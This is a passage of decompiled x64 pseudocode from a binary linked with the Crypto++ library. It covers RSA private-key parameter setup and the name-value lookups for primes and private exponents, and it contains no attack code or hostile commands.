  v8 = v64;
  if ( v63 < v64 )
    v8 = v63;
  v9 = (__int64)v65;
  if ( v65 )
  {
    memset(v65, 0, 8 * v8);
    sub_13F12E4D0(v9);
  }
  sub_13F112AD0((__int64)&v101, 3u);
  LODWORD(v61) = 1;
  v10 = (int)sub_13F11C520(a1 - 64, (__int64)&v101) < 0 || !sub_13F11EB30(a1 - 64, 0i64);
  v11 = v103;
  if ( v102 < v103 )
    v11 = v102;
  v12 = (__int64)v104;
  if ( v104 )
  {
    memset(v104, 0, 8 * v11);
    sub_13F12E4D0(v12);
  }
  if ( v10 )
  {
    sub_13F1053B0(&v101, (const __m128i *)"InvertibleRSAFunction: invalid public exponent");
    sub_13F101600((__int64)pExceptionObject, &v101);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
  }
  v77 = off_13F1866A8;
  sub_13F112A00((__int64)v78, a1 - 64);
  v13 = sub_13F1389B0((__int64)&v101, v60);
  v14 = *(_BYTE *)(v13 + 16);
  v15 = sub_13F14059C(40i64);
  v16 = v15;
  v61 = v15;
  if ( v15 )
  {
    *(_QWORD *)(v15 + 8) = "PointerToPrimeSelector";
    *(_BYTE *)(v15 + 16) = v14;
    *(_BYTE *)(v15 + 17) = 0;
    *(_QWORD *)(v15 + 24) = 0i64;
    *(_QWORD *)v15 = &CryptoPP::AlgorithmParametersTemplate<CryptoPP::PrimeSelector const *>::`vftable';
    *(_QWORD *)(v15 + 32) = &v77;
  }
  else
  {
    v16 = 0i64;
  }
  v61 = v16;
  v17 = *(_QWORD *)(v13 + 8);
  *(_QWORD *)(v13 + 8) = 0i64;
  v18 = *(void (__fastcall ****)(_QWORD, __int64))(v16 + 24);
  if ( v18 )
    (**v18)(v18, 1i64);
  *(_QWORD *)(v16 + 24) = v17;
  v61 = 0i64;
  v19 = *(void (__fastcall ****)(_QWORD, __int64))(v13 + 8);
  if ( v19 )
    (**v19)(v19, 1i64);
  *(_QWORD *)(v13 + 8) = v16;
  *(_BYTE *)(v13 + 16) = v14;
  sub_13F12AA30((__int64)&v74, v13);
  if ( v101.m128i_i64[1] )
    (**(void (__fastcall ***)(__int64, __int64))v101.m128i_i64[1])(v101.m128i_i64[1], 1i64);
  v101.m128i_i64[0] = (__int64)&CryptoPP::NameValuePairs::`vftable';
  if ( !sub_13F11DAE0(a1 + 144, a2, (__int64)&v74) )
  {
    sub_13F1130D0((__int64)pExceptionObject);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVRandomNumberNotFound_Integer_CryptoPP__);
  }
  if ( !sub_13F11DAE0(a1 + 192, a2, (__int64)&v74) )
  {
    sub_13F1130D0((__int64)pExceptionObject);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVRandomNumberNotFound_Integer_CryptoPP__);
  }
  sub_13F112AD0((__int64)v62, 1u);
  sub_13F112AD0((__int64)v70, 1u);
  sub_13F11FBB0(a1 + 192, (__int64)v66, (__int64)v62);
  sub_13F11FBB0(a1 + 144, (__int64)v82, (__int64)v70);
  v20 = sub_13F1275D0((__int64)pExceptionObject, (__int64)v82, (__int64)v66);
  v21 = sub_13F11EDC0(a1 - 64, (__int64)v86, v20);
  sub_13F113500(a1 + 96, v21);
  v22 = v88;
  if ( v87 < v88 )
    v22 = v87;
  v23 = (__int64)v89;
  if ( v89 )
  {
    memset(v89, 0, 8 * v22);
    sub_13F12E4D0(v23);
  }
  v24 = v99;
  if ( v98 < v99 )
    v24 = v98;
  v25 = (__int64)v100;
  if ( v100 )
  {
    memset(v100, 0, 8 * v24);
    sub_13F12E4D0(v25);
  }
  v26 = v84;
  if ( v83 < v84 )
    v26 = v83;
  v27 = (__int64)v85;
  if ( v85 )
  {
    memset(v85, 0, 8 * v26);
    sub_13F12E4D0(v27);
  }
  v28 = v68;
  if ( v67 < v68 )
    v28 = v67;
  v29 = (__int64)v69;
  if ( v69 )
  {
    memset(v69, 0, 8 * v28);
    sub_13F12E4D0(v29);
  }
  v30 = v72;
  if ( v71 < v72 )
    v30 = v71;
  v31 = (__int64)v73;
  if ( v73 )
  {
    memset(v73, 0, 8 * v30);
    sub_13F12E4D0(v31);
  }
  v32 = v64;
  if ( v63 < v64 )
    v32 = v63;
  v33 = (__int64)v65;
  if ( v65 )
  {
    memset(v65, 0, 8 * v32);
    sub_13F12E4D0(v33);
  }
  sub_13F112AD0((__int64)v66, 1u);
  sub_13F11FBB0(a1 + 144, (__int64)v70, (__int64)v66);
  sub_13F11FD00(a1 + 96, (__int64)v62, (__int64)v70);
  sub_13F113500(a1 + 240, (__int64)v62);
  v34 = v64;
  if ( v63 < v64 )
    v34 = v63;
  v35 = (__int64)v65;
  if ( v65 )
  {
    memset(v65, 0, 8 * v34);
    sub_13F12E4D0(v35);
  }
  v36 = v72;
  if ( v71 < v72 )
    v36 = v71;
  v37 = (__int64)v73;
  if ( v73 )
  {
    memset(v73, 0, 8 * v36);
    sub_13F12E4D0(v37);
  }
  v38 = v68;
  if ( v67 < v68 )
    v38 = v67;
  v39 = (__int64)v69;
  if ( v69 )
  {
    memset(v69, 0, 8 * v38);
    sub_13F12E4D0(v39);
  }
  sub_13F112AD0((__int64)v66, 1u);
  sub_13F11FBB0(a1 + 192, (__int64)v70, (__int64)v66);
  sub_13F11FD00(a1 + 96, (__int64)v62, (__int64)v70);
  sub_13F113500(a1 + 288, (__int64)v62);
  v40 = v64;
  if ( v63 < v64 )
    v40 = v63;
  v41 = (__int64)v65;
  if ( v65 )
  {
    memset(v65, 0, 8 * v40);
    sub_13F12E4D0(v41);
  }
  v42 = v72;
  if ( v71 < v72 )
    v42 = v71;
  v43 = (__int64)v73;
  if ( v73 )
  {
    memset(v73, 0, 8 * v42);
    sub_13F12E4D0(v43);
  }
  v44 = v68;
  if ( v67 < v68 )
    v44 = v67;
  v45 = (__int64)v69;
  if ( v69 )
  {
    memset(v69, 0, 8 * v44);
    sub_13F12E4D0(v45);
  }
  sub_13F1234E0(a1 + 144, (__int64)v62, a1 + 192);
  sub_13F113500(a1 - 112, (__int64)v62);
  v46 = v64;
  if ( v63 < v64 )
    v46 = v63;
  v47 = (__int64)v65;
  if ( v65 )
  {
    memset(v65, 0, 8 * v46);
    sub_13F12E4D0(v47);
  }
  v48 = sub_13F11EDC0(a1 + 192, (__int64)pExceptionObject, a1 + 144);
  sub_13F113500(a1 + 336, v48);
  v49 = v99;
  if ( v98 < v99 )
    v49 = v98;
  v50 = (__int64)v100;
  if ( v100 )
  {
    memset(v100, 0, 8 * v49);
    sub_13F12E4D0(v50);
  }
  result = sub_13F102490();
  if ( result )
  {
    v52 = *(int *)(*(_QWORD *)(a1 - 120) + 4i64);
    sub_13F10EE30((__int64)v109, 1);
    sub_13F1061A0(v110, 1);
    v108[65] = (__int64)off_13F1866C0;
    v109[0] = (__int64)off_13F186760;
    v109[1] = (__int64)off_13F1867A8;
    (*(void (__fastcall **)(char *, __int64))(*(__int64 *)((char *)v111 + *(int *)(v111[0] + 4)) + 16))(
      (char *)v111 + *(int *)(v111[0] + 4),
      v52 + a1 - 120);
    sub_13F10EE30((__int64)v94, 1);
    sub_13F1060F0(v95, 1);
    v93[15] = (__int64)off_13F1867D0;
    v94[0] = (__int64)off_13F186880;
    v94[1] = (__int64)off_13F1868C8;
    v53 = *(__int64 *)((char *)v96 + *(int *)(v96[0] + 4));
    v54 = (*(__int64 (__fastcall **)(__int64 *))(v109[0] + 40))(v109);
    (*(void (__fastcall **)(char *, __int64))(v53 + 16))((char *)v96 + *(int *)(v96[0] + 4), v54);
    v55 = *(int *)(*(_QWORD *)(a1 - 120) + 4i64);
    sub_13F10EE30((__int64)v106, 1);
    sub_13F1061A0(v107, 1);
    v105 = off_13F1868F0;
    v106[0] = (__int64)off_13F186948;
    v106[1] = (__int64)off_13F186990;
    (*(void (__fastcall **)(char *, __int64))(*(__int64 *)((char *)v108 + *(int *)(v108[0] + 4)) + 16))(
      (char *)v108 + *(int *)(v108[0] + 4),
      v55 + a1 - 120);
    sub_13F10EE30((__int64)v91, 1);
    sub_13F1060F0(v92, 1);
    v90 = off_13F1869B8;
    v91[0] = (__int64)off_13F186A10;
    v91[1] = (__int64)off_13F186A58;
    v56 = *(__int64 *)((char *)v93 + *(int *)(v93[0] + 4));
    v57 = (*(__int64 (__fastcall **)(__int64 *))(v106[0] + 40))(v106);
    (*(void (__fastcall **)(char *, __int64))(v56 + 16))((char *)v93 + *(int *)(v93[0] + 4), v57);
    sub_13F105A90(v92);
    v93[13] = (__int64)&CryptoPP::NameValuePairs::`vftable';
    sub_13F105B40(v107);
    v108[63] = (__int64)&CryptoPP::NameValuePairs::`vftable';
    sub_13F105A90(v95);
    v96[13] = (__int64)&CryptoPP::NameValuePairs::`vftable';
    result = (unsigned __int8)sub_13F105B40(v110);
  }
  if ( v75 )
    result = (**v75)(v75, 1i64);
  v74 = &CryptoPP::NameValuePairs::`vftable';
  v58 = v80;
  if ( v79 < v80 )
    v58 = v79;
  v59 = (__int64)v81;
  if ( v81 )
  {
    memset(v81, 0, 8 * v58);
    return sub_13F12E4D0(v59);
  }
  return result;
}
// 13F1024B0: using guessed type __int64 __fastcall guard_check_icall_nop();
// 13F182E30: using guessed type void *CryptoPP::NameValuePairs::`vftable';
// 13F1866A8: using guessed type __int64 (__fastcall *off_13F1866A8[3])();
// 13F1866C0: using guessed type __int64 (__fastcall *off_13F1866C0[20])();
// 13F186760: using guessed type void *off_13F186760[9];
// 13F1867A8: using guessed type void *off_13F1867A8[5];
// 13F1867D0: using guessed type __int64 (__fastcall *off_13F1867D0[22])();
// 13F186880: using guessed type void *off_13F186880[9];
// 13F1868C8: using guessed type void *off_13F1868C8[5];
// 13F1868F0: using guessed type __int64 (__fastcall *off_13F1868F0[11])();
// 13F186948: using guessed type void *off_13F186948[9];
// 13F186990: using guessed type void *off_13F186990[5];
// 13F1869B8: using guessed type __int64 (__fastcall *off_13F1869B8[11])();
// 13F186A10: using guessed type void *off_13F186A10[9];
// 13F186A58: using guessed type void *off_13F186A58[4];
// 13F186C30: using guessed type void *CryptoPP::AlgorithmParametersTemplate<CryptoPP::PrimeSelector const *>::`vftable';
// 13F1C3E48: using guessed type int int `RTTI Type Descriptor';
// 13F1259C0: using guessed type char var_6E8[16];
// 13F1259C0: using guessed type char var_688[16];
// 13F1259C0: using guessed type _QWORD var_258[2];
// 13F1259C0: using guessed type _QWORD var_598[2];
// 13F1259C0: using guessed type _QWORD var_488[2];
// 13F1259C0: using guessed type _QWORD var_638[2];

//----- (000000013F1263C0) ----------------------------------------------------
_QWORD *__fastcall sub_13F1263C0(__int64 a1, _QWORD *a2)
{
  _QWORD *v3; // rax
  __int64 v4; // rcx
  unsigned __int64 v5; // rdx
  __int64 (__fastcall **v7)(); // [rsp+28h] [rbp-30h] BYREF
  __int64 v8; // [rsp+30h] [rbp-28h]
  __int64 v9; // [rsp+40h] [rbp-18h]

  v3 = sub_13F128B10(&v7);
  sub_13F113A30(a2, (__int64)v3, 1);
  v7 = off_13F181EC8;
  v4 = v8;
  if ( v8 )
  {
    v5 = (v9 - v8) & 0xFFFFFFFFFFFFFFFCui64;
    if ( v5 >= 0x1000 )
    {
      v5 += 39i64;
      v4 = *(_QWORD *)(v8 - 8);
      if ( (unsigned __int64)(v8 - v4 - 8) > 0x1F )
        sub_13F1682C0();
    }
    sub_13F14088C(v4, v5);
  }
  return a2;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F181EC8: using guessed type __int64 (__fastcall *off_13F181EC8[2])();

//----- (000000013F126450) ----------------------------------------------------
__int64 __fastcall sub_13F126450(__int64 a1, __int64 a2)
{
  *(_QWORD *)a2 = qword_13F188FA0;
  *(_DWORD *)(a2 + 8) = 15;
  return a2;
}
// 13F188FA0: using guessed type __int64 qword_13F188FA0[2];

//----- (000000013F126470) ----------------------------------------------------
_QWORD *sub_13F126470()
{
  return sub_13F127980();
}

//----- (000000013F126480) ----------------------------------------------------
__int64 __fastcall sub_13F126480(__int64 a1)
{
  return a1 + 376;
}

//----- (000000013F126490) ----------------------------------------------------
__int64 __fastcall sub_13F126490(__int64 a1)
{
  return a1 + 424;
}

//----- (000000013F1264A0) ----------------------------------------------------
__int64 __fastcall sub_13F1264A0(__int64 a1)
{
  return a1 + 472;
}

//----- (000000013F1264B0) ----------------------------------------------------
__int64 __fastcall sub_13F1264B0(__int64 a1)
{
  return a1 + 280;
}

//----- (000000013F1264C0) ----------------------------------------------------
__int64 __fastcall sub_13F1264C0(__int64 a1)
{
  return a1 + 328;
}

//----- (000000013F1264D0) ----------------------------------------------------
__int64 __fastcall sub_13F1264D0(__int64 a1)
{
  return a1 + 232;
}

//----- (000000013F1264E0) ----------------------------------------------------
__int64 __fastcall sub_13F1264E0(__int64 a1)
{
  return (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)(a1 - 8) + 136i64))(a1 - 8) + 136;
}

//----- (000000013F126500) ----------------------------------------------------
__int64 __fastcall sub_13F126500(__int64 a1)
{
  return a1 + 72;
}

//----- (000000013F126510) ----------------------------------------------------
__int64 __fastcall sub_13F126510(__int64 a1)
{
  return (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)(a1 - 8) + 152i64))(a1 - 8) + 16;
}

//----- (000000013F126530) ----------------------------------------------------
__int64 __fastcall sub_13F126530(__int64 a1)
{
  return (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)(a1 - 16) + 136i64))(a1 - 16);
}

//----- (000000013F126540) ----------------------------------------------------
__int64 __fastcall sub_13F126540(__int64 a1)
{
  return (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)(a1 - 16) + 152i64))(a1 - 16);
}

//----- (000000013F126550) ----------------------------------------------------
__int64 __fastcall sub_13F126550(__int64 a1)
{
  return (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)(a1 - 16) + 136i64))(a1 - 16) + 120;
}

//----- (000000013F126570) ----------------------------------------------------
__int64 __fastcall sub_13F126570(__int64 a1, __m128i *a2, __int64 a3, _QWORD *a4)
{
  __int64 v4; // rsi
  __int64 *v5; // rax
  __int64 *v6; // rdi
  __m128i *v7; // r14
  __int64 v8; // rdx
  unsigned __int64 v9; // r8
  __m128i *v10; // rax
  __int8 *v11; // rbx
  __int64 v12; // rax
  unsigned __int64 v13; // rdx
  __int8 *v14; // rbx
  __int64 v15; // rcx
  char v16; // al
  __int64 v17; // rbx
  __int64 v18; // rax
  __m128i *v19; // r14
  __int64 v20; // rcx
  unsigned __int64 v21; // rdx
  __m128i *v22; // rax
  __int8 *v23; // rbx
  __int64 v24; // rax
  unsigned __int64 v25; // rdx
  __int8 *v26; // rbx
  char v27; // al
  __int64 v28; // rbx
  __int64 v29; // rax
  __m128i *v30; // rsi
  __int64 v31; // rcx
  unsigned __int64 v32; // rdx
  __m128i *v33; // rax
  __int8 *v34; // rbx
  __int64 v35; // rax
  unsigned __int64 v36; // rdx
  __int8 *v37; // rbx
  __int64 v38; // rbx
  __int64 v39; // rax
  __m128i *v40; // rsi
  __int64 v41; // rcx
  unsigned __int64 v42; // rdx
  __m128i *v43; // rax
  __int8 *v44; // rbx
  __int64 v45; // rax
  unsigned __int64 v46; // rdx
  __int8 *v47; // rbx
  __int64 v48; // rbx
  __int64 v49; // rax
  __m128i *v50; // rsi
  __int64 v51; // rcx
  unsigned __int64 v52; // rdx
  __m128i *v53; // rax
  __int8 *v54; // rbx
  __int64 v55; // rax
  unsigned __int64 v56; // rdx
  __int8 *v57; // rbx
  __int64 v58; // rbx
  __int64 v59; // rax
  __m128i *v60; // rsi
  __int64 v61; // rcx
  unsigned __int64 v62; // rdx
  __m128i *v63; // rax
  __int8 *v64; // rbx
  __int64 v65; // rax
  unsigned __int64 v66; // r9
  __int8 *v67; // rbx
  unsigned __int8 v68; // bl
  __int64 v69; // rbx
  __int64 v70; // rax
  __int64 v72[5]; // [rsp+38h] [rbp-C8h] BYREF
  __m128i v73[2]; // [rsp+60h] [rbp-A0h] BYREF
  char v74[80]; // [rsp+80h] [rbp-80h] BYREF
  char v75[80]; // [rsp+D0h] [rbp-30h] BYREF
  char v76[80]; // [rsp+120h] [rbp+20h] BYREF
  char v77[80]; // [rsp+170h] [rbp+70h] BYREF
  char v78[80]; // [rsp+1C0h] [rbp+C0h] BYREF
  char pExceptionObject[80]; // [rsp+210h] [rbp+110h] BYREF

  v4 = 0i64;
  sub_13F123F80((__int64)v72, a1 - 520, a2, a3, a4, 0i64);
  v5 = sub_13F124C80(v72);
  v6 = v5;
  if ( *((_BYTE *)v5 + 33) )
  {
    v7 = (__m128i *)v5[3];
    v8 = v7[1].m128i_i64[0];
    v9 = v7[1].m128i_u64[1];
    if ( v9 - v8 < 6 )
    {
      v7 = sub_13F107AD0(v7, 6ui64, 0i64, (const __m128i *)"Prime1", 6ui64);
    }
    else
    {
      v7[1].m128i_i64[0] = v8 + 6;
      v10 = v7;
      if ( v9 >= 0x10 )
        v10 = (__m128i *)v7->m128i_i64[0];
      v11 = &v10->m128i_i8[v8];
      sub_13F15EB00((__m128i *)((char *)v10 + v8), (const __m128i *)"Prime1", 6ui64);
      v11[6] = 0;
    }
    v12 = v7[1].m128i_i64[0];
    v13 = v7[1].m128i_u64[1];
    if ( v13 == v12 )
    {
      sub_13F107AD0(v7, 1ui64, 0i64, (const __m128i *)&qword_13F186BF0, 1ui64);
    }
    else
    {
      v7[1].m128i_i64[0] = v12 + 1;
      if ( v13 >= 0x10 )
        v7 = (__m128i *)v7->m128i_i64[0];
      v14 = &v7->m128i_i8[v12];
      sub_13F15EB00((__m128i *)((char *)v7 + v12), (const __m128i *)&qword_13F186BF0, 1ui64);
      v14[1] = 0;
    }
  }
  if ( !*((_BYTE *)v6 + 32) )
  {
    v15 = 0i64;
    while ( 1 )
    {
      v16 = aPrime1[v15++];
      if ( v16 != *(_BYTE *)(v6[1] + v15 - 1) )
        break;
      if ( v15 == 7 )
      {
        v17 = v6[2];
        if ( (unsigned int)sub_13F15E52C((__int64)&qword_13F1BF2C8, v17 + 8) )
        {
          sub_13F1053B0(v73, (const __m128i *)"Prime1");
          sub_13F101710((__int64)v74, v73, (__int64)&CryptoPP::Integer `RTTI Type Descriptor', v17);
          CxxThrowException(v74, (_ThrowInfo *)&_TI4_AVValueTypeMismatch_NameValuePairs_CryptoPP__);
        }
        v18 = sub_13F1264B0(*v6 + **(int **)(*v6 + 16));
        sub_13F113500(v6[3], v18);
        *((_BYTE *)v6 + 32) = 1;
        break;
      }
    }
  }
  if ( *((_BYTE *)v6 + 33) )
  {
    v19 = (__m128i *)v6[3];
    v20 = v19[1].m128i_i64[0];
    v21 = v19[1].m128i_u64[1];
    if ( v21 - v20 < 6 )
    {
      v19 = sub_13F107AD0(v19, 6ui64, 0i64, (const __m128i *)"Prime2", 6ui64);
    }
    else
    {
      v19[1].m128i_i64[0] = v20 + 6;
      v22 = v19;
      if ( v21 >= 0x10 )
        v22 = (__m128i *)v19->m128i_i64[0];
      v23 = &v22->m128i_i8[v20];
      sub_13F15EB00((__m128i *)((char *)v22 + v20), (const __m128i *)"Prime2", 6ui64);
      v23[6] = 0;
    }
    v24 = v19[1].m128i_i64[0];
    v25 = v19[1].m128i_u64[1];
    if ( v25 == v24 )
    {
      sub_13F107AD0(v19, 1ui64, 0i64, (const __m128i *)&qword_13F186BF0, 1ui64);
    }
    else
    {
      v19[1].m128i_i64[0] = v24 + 1;
      if ( v25 >= 0x10 )
        v19 = (__m128i *)v19->m128i_i64[0];
      v26 = &v19->m128i_i8[v24];
      sub_13F15EB00((__m128i *)((char *)v19 + v24), (const __m128i *)&qword_13F186BF0, 1ui64);
      v26[1] = 0;
    }
  }
  if ( !*((_BYTE *)v6 + 32) )
  {
    while ( 1 )
    {
      v27 = aPrime2[v4++];
      if ( v27 != *(_BYTE *)(v6[1] + v4 - 1) )
        break;
      if ( v4 == 7 )
      {
        v28 = v6[2];
        if ( (unsigned int)sub_13F15E52C((__int64)&qword_13F1BF2C8, v28 + 8) )
        {
          sub_13F1053B0(v73, (const __m128i *)"Prime2");
          sub_13F101710((__int64)v75, v73, (__int64)&CryptoPP::Integer `RTTI Type Descriptor', v28);
          CxxThrowException(v75, (_ThrowInfo *)&_TI4_AVValueTypeMismatch_NameValuePairs_CryptoPP__);
        }
        v29 = sub_13F1264C0(*v6 + **(int **)(*v6 + 16));
        sub_13F113500(v6[3], v29);
        *((_BYTE *)v6 + 32) = 1;
        break;
      }
    }
  }
  if ( *((_BYTE *)v6 + 33) )
  {
    v30 = (__m128i *)v6[3];
    v31 = v30[1].m128i_i64[0];
    v32 = v30[1].m128i_u64[1];
    if ( v32 - v31 < 0xF )
    {
      v30 = sub_13F107AD0(v30, 0xFui64, 0i64, (const __m128i *)"PrivateExponent", 0xFui64);
    }
    else
    {
      v30[1].m128i_i64[0] = v31 + 15;
      v33 = v30;
      if ( v32 >= 0x10 )
        v33 = (__m128i *)v30->m128i_i64[0];
      v34 = &v33->m128i_i8[v31];
      sub_13F15EB00((__m128i *)((char *)v33 + v31), (const __m128i *)"PrivateExponent", 0xFui64);
      v34[15] = 0;
    }
    v35 = v30[1].m128i_i64[0];
    v36 = v30[1].m128i_u64[1];
    if ( v36 == v35 )
    {
      sub_13F107AD0(v30, 1ui64, 0i64, (const __m128i *)&qword_13F186BF0, 1ui64);
    }
    else
    {
      v30[1].m128i_i64[0] = v35 + 1;
      if ( v36 >= 0x10 )
        v30 = (__m128i *)v30->m128i_i64[0];
      v37 = &v30->m128i_i8[v35];
      sub_13F15EB00((__m128i *)((char *)v30 + v35), (const __m128i *)&qword_13F186BF0, 1ui64);
      v37[1] = 0;
    }
  }
  if ( !*((_BYTE *)v6 + 32) && !(unsigned int)sub_13F16A230("PrivateExponent", v6[1]) )
  {
    v38 = v6[2];
    if ( (unsigned int)sub_13F15E52C((__int64)&qword_13F1BF2C8, v38 + 8) )
    {
      sub_13F1053B0(v73, (const __m128i *)"PrivateExponent");
      sub_13F101710((__int64)v76, v73, (__int64)&CryptoPP::Integer `RTTI Type Descriptor', v38);
      CxxThrowException(v76, (_ThrowInfo *)&_TI4_AVValueTypeMismatch_NameValuePairs_CryptoPP__);
    }
    v39 = sub_13F1264D0(*v6 + **(int **)(*v6 + 16));
    sub_13F113500(v6[3], v39);
    *((_BYTE *)v6 + 32) = 1;
  }
  if ( *((_BYTE *)v6 + 33) )
  {
    v40 = (__m128i *)v6[3];
    v41 = v40[1].m128i_i64[0];
    v42 = v40[1].m128i_u64[1];
    if ( v42 - v41 < 0x18 )
    {
      v40 = sub_13F107AD0(v40, 0x18ui64, 0i64, (const __m128i *)"ModPrime1PrivateExponent", 0x18ui64);
    }
    else
    {
      v40[1].m128i_i64[0] = v41 + 24;
      v43 = v40;
      if ( v42 >= 0x10 )
        v43 = (__m128i *)v40->m128i_i64[0];
      v44 = &v43->m128i_i8[v41];
      sub_13F15EB00((__m128i *)((char *)v43 + v41), (const __m128i *)"ModPrime1PrivateExponent", 0x18ui64);
      v44[24] = 0;
    }
    v45 = v40[1].m128i_i64[0];
    v46 = v40[1].m128i_u64[1];
    if ( v46 == v45 )
    {
      sub_13F107AD0(v40, 1ui64, 0i64, (const __m128i *)&qword_13F186BF0, 1ui64);
    }
    else
    {
      v40[1].m128i_i64[0] = v45 + 1;
      if ( v46 >= 0x10 )
        v40 = (__m128i *)v40->m128i_i64[0];
      v47 = &v40->m128i_i8[v45];
      sub_13F15EB00((__m128i *)((char *)v40 + v45), (const __m128i *)&qword_13F186BF0, 1ui64);
      v47[1] = 0;
    }
  }
  if ( !*((_BYTE *)v6 + 32) && !(unsigned int)sub_13F16A230("ModPrime1PrivateExponent", v6[1]) )
  {
    v48 = v6[2];
    if ( (unsigned int)sub_13F15E52C((__int64)&qword_13F1BF2C8, v48 + 8) )
    {
      sub_13F1053B0(v73, (const __m128i *)"ModPrime1PrivateExponent");
      sub_13F101710((__int64)v77, v73, (__int64)&CryptoPP::Integer `RTTI Type Descriptor', v48);
      CxxThrowException(v77, (_ThrowInfo *)&_TI4_AVValueTypeMismatch_NameValuePairs_CryptoPP__);
    }
    v49 = sub_13F126480(*v6 + **(int **)(*v6 + 16));
    sub_13F113500(v6[3], v49);
    *((_BYTE *)v6 + 32) = 1;
  }
  if ( *((_BYTE *)v6 + 33) )
  {
    v50 = (__m128i *)v6[3];
    v51 = v50[1].m128i_i64[0];
    v52 = v50[1].m128i_u64[1];
    if ( v52 - v51 < 0x18 )
    {
      v50 = sub_13F107AD0(v50, 0x18ui64, 0i64, (const __m128i *)"ModPrime2PrivateExponent", 0x18ui64);
    }
    else
    {
      v50[1].m128i_i64[0] = v51 + 24;
      v53 = v50;
      if ( v52 >= 0x10 )
        v53 = (__m128i *)v50->m128i_i64[0];
      v54 = &v53->m128i_i8[v51];
      sub_13F15EB00((__m128i *)((char *)v53 + v51), (const __m128i *)"ModPrime2PrivateExponent", 0x18ui64);
      v54[24] = 0;
    }
    v55 = v50[1].m128i_i64[0];
    v56 = v50[1].m128i_u64[1];
    if ( v56 == v55 )
    {
      sub_13F107AD0(v50, 1ui64, 0i64, (const __m128i *)&qword_13F186BF0, 1ui64);
    }
    else
    {
      v50[1].m128i_i64[0] = v55 + 1;
      if ( v56 >= 0x10 )
        v50 = (__m128i *)v50->m128i_i64[0];
      v57 = &v50->m128i_i8[v55];
      sub_13F15EB00((__m128i *)((char *)v50 + v55), (const __m128i *)&qword_13F186BF0, 1ui64);
      v57[1] = 0;
    }
  }
  if ( !*((_BYTE *)v6 + 32) && !(unsigned int)sub_13F16A230("ModPrime2PrivateExponent", v6[1]) )
  {
    v58 = v6[2];
    if ( (unsigned int)sub_13F15E52C((__int64)&qword_13F1BF2C8, v58 + 8) )
    {
      sub_13F1053B0(v73, (const __m128i *)"ModPrime2PrivateExponent");
      sub_13F101710((__int64)v78, v73, (__int64)&CryptoPP::Integer `RTTI Type Descriptor', v58);
      CxxThrowException(v78, (_ThrowInfo *)&_TI4_AVValueTypeMismatch_NameValuePairs_CryptoPP__);
    }
    v59 = sub_13F126490(*v6 + **(int **)(*v6 + 16));
    sub_13F113500(v6[3], v59);
    *((_BYTE *)v6 + 32) = 1;
  }
  if ( *((_BYTE *)v6 + 33) )
  {
    v60 = (__m128i *)v6[3];
    v61 = v60[1].m128i_i64[0];
    v62 = v60[1].m128i_u64[1];
    if ( v62 - v61 < 0x26 )
    {
      v60 = sub_13F107AD0(v60, 0x26ui64, 0i64, (const __m128i *)"MultiplicativeInverseOfPrime2ModPrime1", 0x26ui64);
    }
    else
    {
      v60[1].m128i_i64[0] = v61 + 38;
      v63 = v60;
      if ( v62 >= 0x10 )
        v63 = (__m128i *)v60->m128i_i64[0];
      v64 = &v63->m128i_i8[v61];
      sub_13F15EB00((__m128i *)((char *)v63 + v61), (const __m128i *)"MultiplicativeInverseOfPrime2ModPrime1", 0x26ui64);
      v64[38] = 0;
    }
    v65 = v60[1].m128i_i64[0];
    v66 = v60[1].m128i_u64[1];
    if ( v66 == v65 )
    {
      sub_13F107AD0(v60, 1ui64, 0i64, (const __m128i *)&qword_13F186BF0, 1ui64);
    }
    else
    {
      v60[1].m128i_i64[0] = v65 + 1;
      if ( v66 >= 0x10 )
        v60 = (__m128i *)v60->m128i_i64[0];
      v67 = &v60->m128i_i8[v65];
      sub_13F15EB00((__m128i *)((char *)v60 + v65), (const __m128i *)&qword_13F186BF0, 1ui64);
      v67[1] = 0;
    }
  }
  v68 = *((_BYTE *)v6 + 32);
  if ( !v68 && !(unsigned int)sub_13F16A230("MultiplicativeInverseOfPrime2ModPrime1", v6[1]) )
  {
    v69 = v6[2];
    if ( (unsigned int)sub_13F15E52C((__int64)&qword_13F1BF2C8, v69 + 8) )
    {
      sub_13F1053B0(v73, (const __m128i *)"MultiplicativeInverseOfPrime2ModPrime1");
      sub_13F101710((__int64)pExceptionObject, v73, (__int64)&CryptoPP::Integer `RTTI Type Descriptor', v69);
      CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVValueTypeMismatch_NameValuePairs_CryptoPP__);
    }
    v70 = sub_13F1264A0(*v6 + **(int **)(*v6 + 16));
    sub_13F113500(v6[3], v70);
    *((_BYTE *)v6 + 32) = 1;
    return 1;
  }
  return v68;
}
// 13F186BF0: using guessed type __int64 qword_13F186BF0;
// 13F1BF2C8: using guessed type __int64 qword_13F1BF2C8;
// 13F126570: using guessed type __int64 var_268[5];
// 13F126570: using guessed type __m128i var_240[2];

//----- (000000013F126EB0) ----------------------------------------------------
__int64 __fastcall sub_13F126EB0(__int64 a1, __m128i *a2, __int64 a3, _QWORD *a4)
{
  __int64 v4; // rdi
  __int64 *v5; // rax
  __int64 *v6; // r14
  __m128i *v7; // rsi
  __int64 v8; // rdx
  unsigned __int64 v9; // r8
  __m128i *v10; // rax
  __int8 *v11; // rbx
  __int64 v12; // rax
  unsigned __int64 v13; // rdx
  __int8 *v14; // rbx
  char v15; // al
  __int64 v16; // rbx
  __int64 v17; // rax
  __m128i *v18; // rdi
  __int64 v19; // rcx
  unsigned __int64 v20; // rdx
  __m128i *v21; // rax
  __int8 *v22; // rbx
  __int64 v23; // rax
  unsigned __int64 v24; // r9
  __int8 *v25; // rbx
  unsigned __int8 v26; // bl
  __int64 v27; // rbx
  __int64 v28; // rax
  __int64 v30[5]; // [rsp+38h] [rbp-120h] BYREF
  __m128i v31[2]; // [rsp+60h] [rbp-F8h] BYREF
  char v32[80]; // [rsp+80h] [rbp-D8h] BYREF
  char pExceptionObject[80]; // [rsp+D0h] [rbp-88h] BYREF

  v4 = 0i64;
  sub_13F124220((__int64)v30, a1 - 120, a2, a3, a4, 0i64);
  v5 = sub_13F124EC0(v30);
  v6 = v5;
